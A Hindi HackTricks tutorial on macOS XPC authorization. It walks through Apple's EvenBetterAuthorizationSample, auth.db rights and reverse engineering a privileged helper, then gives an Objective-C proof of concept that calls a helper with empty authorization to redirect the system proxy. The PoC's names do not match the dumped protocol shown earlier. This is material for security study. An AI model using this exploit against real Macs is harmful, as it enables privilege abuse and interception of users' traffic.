# macOS XPC प्राधिकरण

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से नायक तक AWS हैकिंग सीखें</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपोज़ में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>

## XPC प्राधिकरण

Apple एक और तरीका भी प्रस्तावित करता है जिससे पता चलता है कि क्या कनेक्टिंग प्रोसेस के पास **एक्सपोज़्ड XPC मेथड को कॉल करने की अनुमति है**।

जब किसी एप्लिकेशन को **विशेषाधिकार प्राप्त उपयोगकर्ता के रूप में कार्य करने की आवश्यकता होती है**, तो एप्लिकेशन को विशेषाधिकार प्राप्त उपयोगकर्ता के रूप में चलाने के बजाय आमतौर पर एक XPC सेवा के रूप में एक HelperTool को रूट के रूप में इंस्टॉल किया जाता है जिसे उन कार्यों को करने के लिए एप्लिकेशन से कॉल किया जा सकता है। हालांकि, सेवा को कॉल करने वाले एप्लिकेशन के पास पर्याप्त प्राधिकरण होना चाहिए।

### ShouldAcceptNewConnection हमेशा YES

एक उदाहरण [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample) में पाया जा सकता है। `App/AppDelegate.m` में यह **HelperTool** से **कनेक्ट** करने की कोशिश करता है। और `HelperTool/HelperTool.m` में फंक्शन **`shouldAcceptNewConnection`** पहले बताई गई किसी भी आवश्यकता की **जांच नहीं करेगा**। यह हमेशा YES लौटाएगा:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
इस जांच को उचित रूप से कॉन्फ़िगर करने के बारे में अधिक जानकारी के लिए:

{% content-ref url="macos-xpc-connecting-process-check/" %}
[macos-xpc-connecting-process-check](macos-xpc-connecting-process-check/)
{% endcontent-ref %}

### एप्लिकेशन अधिकार

हालांकि, जब HelperTool से कोई मेथड कॉल किया जाता है तो कुछ **अधिकृतीकरण हो रहा है**।

`App/AppDelegate.m` से **`applicationDidFinishLaunching`** फंक्शन एप्लिकेशन शुरू होने के बाद एक खाली अधिकृतीकरण संदर्भ बनाएगा। यह हमेशा काम करना चाहिए।\
फिर, यह `setupAuthorizationRights` को कॉल करके उस अधिकृतीकरण संदर्भ में कुछ अधिकार जोड़ने की कोशिश करेगा:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
`setupAuthorizationRights` फ़ंक्शन `Common/Common.m` से एप्लिकेशन के अधिकारों को ऑथ डेटाबेस `/var/db/auth.db` में संग्रहीत करेगा। ध्यान दें कि यह केवल उन अधिकारों को जोड़ेगा जो अभी तक डेटाबेस में नहीं हैं:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
फ़ंक्शन `enumerateRightsUsingBlock` वह है जिसका उपयोग एप्लिकेशन्स की अनुमतियाँ प्राप्त करने के लिए किया जाता है, जो `commandInfo` में परिभाषित होती हैं:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
इसका मतलब है कि इस प्रक्रिया के अंत में, `commandInfo` के अंदर घोषित अनुमतियां `/var/db/auth.db` में संग्रहीत की जाएंगी। ध्यान दें कि वहां आप प्रत्येक विधि के लिए जो **प्रमाणीकरण की आवश्यकता होगी**, **अनुमति का नाम** और **`kCommandKeyAuthRightDefault`** पा सकते हैं। बाद वाला यह **संकेत करता है कि कौन इस अधिकार को प्राप्त कर सकता है**।

यह दर्शाने के लिए कि कौन एक अधिकार को पहुंच सकता है, विभिन्न स्कोप हैं। उनमें से कुछ [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity\_authorization/lib/AuthorizationDB.h) में परिभाषित किए गए हैं (आप [उन सभी को यहां पा सकते हैं](https://www.dssw.co.uk/reference/authorization-rights/)), लेकिन सारांश के रूप में:

<table><thead><tr><th width="284.3333333333333">नाम</th><th width="165">मान</th><th>विवरण</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>कोई भी</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>कोई नहीं</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>वर्तमान उपयोगकर्ता को एक एडमिन होना चाहिए (एडमिन समूह के अंदर)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>उपयोगकर्ता से प्रमाणीकरण के लिए कहें।</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>उपयोगकर्ता से प्रमाणीकरण के लिए कहें। उसे एक एडमिन होना चाहिए (एडमिन समूह के अंदर)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>नियम निर्दिष्ट करें</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>अधिकार पर कुछ अतिरिक्त टिप्पणियां निर्दिष्ट करें</td></tr></tbody></table>

### अधिकार सत्यापन

`HelperTool/HelperTool.m` में **`readLicenseKeyAuthorization`** फ़ंक्शन यह जांचता है कि कॉलर को **ऐसी विधि को निष्पादित करने का अधिकार है** फ़ंक्शन **`checkAuthorization`** को कॉल करके। यह फ़ंक्शन जांचेगा कि कॉलिंग प्रक्रिया द्वारा भेजा गया **authData** का **सही प्रारूप है** और फिर यह जांचेगा **किसी विशेष विधि को कॉल करने के लिए अधिकार प्राप्त करने के लिए क्या आवश्यक है**। अगर सब कुछ अच्छा होता है तो **लौटाया गया `error` `nil` होगा**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
ध्यान दें कि **उस method को कॉल करने के लिए सही अधिकार प्राप्त करने की आवश्यकताओं की जांच करने के लिए** function `authorizationRightForCommand` पहले कमेंट किए गए object **`commandInfo`** की जांच करेगा। फिर, यह **`AuthorizationCopyRights`** को कॉल करेगा ताकि यह जांच सके कि **क्या उसे उस function को कॉल करने के अधिकार हैं** (ध्यान दें कि flags उपयोगकर्ता के साथ इंटरैक्शन की अनुमति देते हैं)।

इस मामले में, function `readLicenseKeyAuthorization` को कॉल करने के लिए `kCommandKeyAuthRightDefault` को `@kAuthorizationRuleClassAllow` के रूप में परिभाषित किया गया है। इसलिए **कोई भी इसे कॉल कर सकता है**।

### DB जानकारी

यह उल्लेख किया गया था कि यह जानकारी `/var/db/auth.db` में संग्रहीत है। आप सभी संग्रहीत नियमों को इसके साथ लिस्ट कर सकते हैं:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
```markdown
फिर, आप यह पढ़ सकते हैं कि अधिकार का उपयोग कौन कर सकता है:
```
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### अनुमति वाले अधिकार

आप **सभी अनुमति कॉन्फ़िगरेशन** [**यहाँ पा सकते हैं**](https://www.dssw.co.uk/reference/authorization-rights/), लेकिन वे संयोजन जिनके लिए उपयोगकर्ता की बातचीत की आवश्यकता नहीं होगी:

1. **'authenticate-user': 'false'**
* यह सबसे सीधी कुंजी है। अगर इसे `false` पर सेट किया जाता है, तो यह निर्दिष्ट करता है कि उपयोगकर्ता को इस अधिकार को प्राप्त करने के लिए प्रमाणीकरण प्रदान करने की आवश्यकता नहीं है।
* इसका उपयोग **नीचे दिए गए 2 में से एक के साथ संयोजन में या उस समूह को इंगित करने के लिए किया जाता है** जिसमें उपयोगकर्ता को सम्मिलित होना चाहिए।
2. **'allow-root': 'true'**
* अगर उपयोगकर्ता रूट उपयोगकर्ता के रूप में काम कर रहा है (जिसके पास उन्नत अनुमतियाँ होती हैं), और यह कुंजी `true` पर सेट की गई है, तो रूट उपयोगकर्ता इस अधिकार को आगे के प्रमाणीकरण के बिना प्राप्त कर सकता है। हालांकि, आमतौर पर, रूट उपयोगकर्ता की स्थिति तक पहुँचने के लिए पहले से ही प्रमाणीकरण की आवश्यकता होती है, इसलिए यह अधिकांश उपयोगकर्ताओं के लिए "कोई प्रमाणीकरण नहीं" परिदृश्य नहीं है।
3. **'session-owner': 'true'**
* अगर इसे `true` पर सेट किया जाता है, तो सत्र के मालिक (वर्तमान में लॉग-इन किया गया उपयोगकर्ता) इस अधिकार को स्वतः प्राप्त कर लेगा। यह अतिरिक्त प्रमाणीकरण को दरकिनार कर सकता है अगर उपयोगकर्ता पहले से ही लॉग-इन है।
4. **'shared': 'true'**
* यह कुंजी बिना प्रमाणीकरण के अधिकार प्रदान नहीं करती है। इसके बजाय, अगर इसे `true` पर सेट किया जाता है, तो इसका मतलब है कि एक बार अधिकार को प्रमाणीकृत किया जाता है, तो यह कई प्रक्रियाओं के बीच साझा किया जा सकता है बिना प्रत्येक को फिर से प्रमाणीकृत करने की आवश्यकता के। लेकिन अधिकार की प्रारंभिक अनुमति के लिए अभी भी प्रमाणीकरण की आवश्यकता होगी जब तक कि इसे अन्य कुंजियों जैसे कि `'authenticate-user': 'false'` के साथ संयोजित नहीं किया जाता है।

आप दिलचस्प अधिकार प्राप्त करने के लिए [**इस स्क्रिप्ट का उपयोग कर सकते हैं**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9)।
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## ऑथराइजेशन की रिवर्स इंजीनियरिंग

### जांच करें कि क्या EvenBetterAuthorization का उपयोग हो रहा है

यदि आपको फंक्शन: **`[HelperTool checkAuthorization:command:]`** मिलता है, तो संभवतः प्रक्रिया पहले उल्लिखित स्कीमा का उपयोग कर रही है ऑथराइजेशन के लिए:

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

यदि यह फंक्शन जैसे `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree` को कॉल कर रहा है, तो यह [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154) का उपयोग कर रहा है।

**`/var/db/auth.db`** की जांच करें कि क्या यह संभव है कि बिना यूजर इंटरैक्शन के कुछ विशेषाधिकार प्राप्त कार्रवाई को कॉल करने की अनुमति प्राप्त की जा सकती है।

### प्रोटोकॉल संचार

फिर, आपको प्रोटोकॉल स्कीमा को ढूंढना होगा ताकि XPC सेवा के साथ संचार स्थापित किया जा सके।

फंक्शन **`shouldAcceptNewConnection`** निर्यात किए जा रहे प्रोटोकॉल को इंगित करता है:

<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

इस मामले में, हमारे पास EvenBetterAuthorizationSample के समान है, [**इस लाइन को देखें**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

इस्तेमाल किए जा रहे प्रोटोकॉल का नाम जानकर, इसकी हेडर डेफिनिशन को **डंप किया जा सकता है** इसके साथ:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
अंत में, हमें सिर्फ **नाम जानने की आवश्यकता है जो Mach Service के लिए प्रकट होता है** ताकि हम इसके साथ संवाद स्थापित कर सकें। इसे खोजने के कई तरीके हैं:

* **`[HelperTool init]`** में जहाँ आप Mach Service का उपयोग होते देख सकते हैं:

<figure><img src="../../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

* launchd plist में:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### उदाहरण का दोहन

इस उदाहरण में निर्मित है:

* प्रोटोकॉल की परिभाषा फंक्शन्स के साथ
* एक्सेस मांगने के लिए एक खाली प्रमाणीकरण
* XPC सेवा से एक कनेक्शन
* यदि कनेक्शन सफल रहा तो फंक्शन को कॉल करना
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## संदर्भ

* [https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/](https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से नायक तक AWS हैकिंग सीखें</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में शामिल हों या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग तरकीबें साझा करें।

</details>
